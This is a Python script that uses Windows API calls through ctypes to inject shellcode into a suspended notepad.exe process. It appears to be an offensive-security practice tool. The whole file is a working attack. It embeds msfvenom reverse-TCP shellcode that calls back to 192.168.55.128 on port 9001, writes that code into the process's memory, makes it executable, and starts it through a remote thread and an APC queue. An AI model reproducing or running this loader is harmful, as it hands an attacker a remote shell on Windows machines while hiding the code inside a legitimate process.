from ctypes import *
from ctypes import wintypes
import subprocess

kernel32 = windll.kernel32
SIZE_T = c_size_t
LPSTR = POINTER(c_char)
LPBYTE = POINTER(c_ubyte)

'''
win32 api calls to setup
1. CreateProcessA -> spawn new 	DONE
2. VirtualAllocEx -> carve out a space in memory DONE
3. WriteProcessMemory -> write the shellcode into memory DONE
4. VirtualProtectEx -> change the memory protections DONE
5. CreateRemoteThread -> spawn new thread to run malware
'''

# struct for _SECURITY_ATTRIBUTES -> used in CreateProcessA
class _SECURITY_ATTRIBUTES(Structure):
	_fields_ = [
	("nLength", wintypes.DWORD),
	("lpSecurityDescriptor", wintypes.LPVOID),
	("bInheritHandle", wintypes.BOOL)
	]

# struct for _STARTUPINFOA -> used in CreateProcessA
class _STARTUPINFOA(Structure):
	_fields_ = [
	("cb",wintypes.DWORD),
	("lpReserved",wintypes.LPSTR),
	("lpDesktop",wintypes.LPSTR),
	("lpTitle",wintypes.LPSTR),
	("dwX",wintypes.DWORD),
	("dwY",wintypes.DWORD),
	("dwXSize",wintypes.DWORD),
	("dwYSize",wintypes.DWORD),
	("dwXCountChars",wintypes.DWORD),
	("dwYCountChars",wintypes.DWORD),
	("dwFillAttribute",wintypes.DWORD),
	("dwFlags",wintypes.DWORD),
	("wShowWindow",wintypes.WORD),
	("cbReserved2",wintypes.WORD),
	("lpReserved2",wintypes.LPBYTE),
	("hStdInput",wintypes.HANDLE),
	("hStdOutput",wintypes.HANDLE),
	("hStdError",wintypes.HANDLE),
	]

# We can use this to grab things like the Process ID and other information we can pass into the API calls.
class PROCESS_INFORMATION(Structure):
	_fields_ = [
	("hProcess", wintypes.HANDLE),
	("hThread", wintypes.HANDLE),
	("dwProcessId", wintypes.DWORD),
	("dwThreadId", wintypes.DWORD)
	]

SECURITY_ATTRIBUTES = _SECURITY_ATTRIBUTES
LPSECURITY_ATTRIBUTES = POINTER(_SECURITY_ATTRIBUTES)
LPTHREAD_START_ROUTINE = wintypes.LPVOID

# Misc vars to use later in script
CREATE_SUSPENDED = 0x00000004
CREATE_NO_WINDOW = 0x08000000
PAGE_EXECUTE_READ = 0x20
PAGE_READ_WRITE = 0x04

MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
EXECUTE_IMMEDIATELY = 0x0
PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0x00000FFF)

CreateProcessA = kernel32.CreateProcessA
CreateProcessA.argtypes = (wintypes.LPCSTR, wintypes.LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, wintypes.BOOL, wintypes.DWORD, wintypes.LPVOID, wintypes.LPCSTR, POINTER(_STARTUPINFOA), POINTER(PROCESS_INFORMATION))
CreateProcessA.restype = wintypes.BOOL

VirtualAllocEx = kernel32.VirtualAllocEx
VirtualAllocEx.argtypes = (wintypes.HANDLE, wintypes.LPVOID, SIZE_T, wintypes.DWORD, wintypes.DWORD)
VirtualAllocEx.restype = wintypes.LPVOID

WriteProcessMemory = kernel32.WriteProcessMemory
WriteProcessMemory.argtypes = (wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID, SIZE_T, POINTER(SIZE_T))
WriteProcessMemory.restype = wintypes.BOOL

VirtualProtectEx = kernel32.VirtualProtectEx
VirtualProtectEx.argtypes = (wintypes.HANDLE, wintypes.LPVOID, SIZE_T, wintypes.DWORD, wintypes.LPDWORD)
VirtualProtectEx.restype = wintypes.BOOL

CreateRemoteThread = kernel32.CreateRemoteThread
CreateRemoteThread.argtypes = (wintypes.HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, wintypes.LPVOID, wintypes.DWORD, wintypes.LPDWORD)
CreateRemoteThread.restype = wintypes.HANDLE

PAPCFUNC = CFUNCTYPE(None, POINTER(wintypes.ULONG))

QueueUserAPC = kernel32.QueueUserAPC
QueueUserAPC.argtypes = (PAPCFUNC, wintypes.HANDLE, POINTER(wintypes.ULONG))
QueueUserAPC.restype = wintypes.BOOL

ResumeThread = kernel32.ResumeThread
ResumeThread.argtypes = (wintypes.HANDLE, )
ResumeThread.restype = wintypes.BOOL

def verify(x):
	if not x:
		raise WinError()

# STARTUPINFOA
startup_info = _STARTUPINFOA()
startup_info.cb = sizeof(startup_info) # cb holds size of structure
startup_info.dwFlags = 1 # set this to say that wShowWindow contains additional information
startup_info.wShowWindow = 1 # set this for SW_SHOWNORMAL which spawns the GUI application

process_info = PROCESS_INFORMATION()

# Create process we will execute shellcode from
created_process = CreateProcessA(b"C:\\Windows\\System32\\notepad.exe", None, None, None, False,  CREATE_SUSPENDED, None, None, byref(startup_info), byref(process_info))

# Gather information about process to be injected.
pid = process_info.dwProcessId
h_process = process_info.hProcess
thread_id = process_info.dwThreadId
h_thread = process_info.hThread

# msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.55.128 LPORT=9001 -f python
# [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
# [-] No arch selected, selecting arch: x64 from the payload
# No encoder specified, outputting raw payload
# Payload size: 460 bytes
# Final size of python file: 2280 bytes
buf =  b""
buf += b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51"
buf += b"\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52"
buf += b"\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72"
buf += b"\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0"
buf += b"\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
buf += b"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b"
buf += b"\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
buf += b"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44"
buf += b"\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41"
buf += b"\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
buf += b"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1"
buf += b"\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44"
buf += b"\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
buf += b"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
buf += b"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
buf += b"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
buf += b"\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x49"
buf += b"\xbe\x77\x73\x32\x5f\x33\x32\x00\x00\x41\x56\x49"
buf += b"\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49\x89\xe5"
buf += b"\x49\xbc\x02\x00\x23\x29\xac\x10\x93\x81\x41\x54"
buf += b"\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07"
buf += b"\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41"
buf += b"\xba\x29\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9"
buf += b"\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0"
buf += b"\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5\x48"
buf += b"\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9"
buf += b"\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81\xc4\x40"
buf += b"\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00"
buf += b"\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d"
buf += b"\x31\xc0\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44"
buf += b"\x24\x54\x01\x01\x48\x8d\x44\x24\x18\xc6\x00\x68"
buf += b"\x48\x89\xe6\x56\x50\x41\x50\x41\x50\x41\x50\x49"
buf += b"\xff\xc0\x41\x50\x49\xff\xc8\x4d\x89\xc1\x4c\x89"
buf += b"\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48\x31\xd2"
buf += b"\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
buf += b"\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d"
buf += b"\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb"
buf += b"\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41"
buf += b"\x89\xda\xff\xd5"

# Print info on notepad process
print("Started Process => Handle: {}, PID: {}, TID: {}".format(h_process, pid, thread_id))

# Carve out memory in our notepad process as read write only
remote_memory = VirtualAllocEx(h_process, False, len(buf), MEM_COMMIT | MEM_RESERVE, PAGE_READ_WRITE)
verify(remote_memory)
print("Memory Allocated => ", hex(remote_memory))

# Write buffer to area of memory
write = WriteProcessMemory(h_process, remote_memory, buf, len(buf), None)
verify(write)
print("Bytes Written = > {}".format(len(buf)))

# Change permissions of memory space with shellcode
old_protection = wintypes.DWORD(0)
memory_execute = VirtualProtectEx(h_process, remote_memory, len(buf), PAGE_EXECUTE_READ, old_protection)
verify(memory_execute)
print("Memory Protection updated from {} to {}".format(old_protection.value, PAGE_EXECUTE_READ))

# Execute the shellcode
remote_thread = CreateRemoteThread(h_process, None, 0, remote_memory, None, EXECUTE_IMMEDIATELY, None)

rqueue = QueueUserAPC(PAPCFUNC(remote_memory), h_thread, None)
verify(rqueue)
print("Queueing APC Thread => {}".format(h_thread))

rthread = ResumeThread(h_thread)
verify(rthread)
print("Resuming Thread!")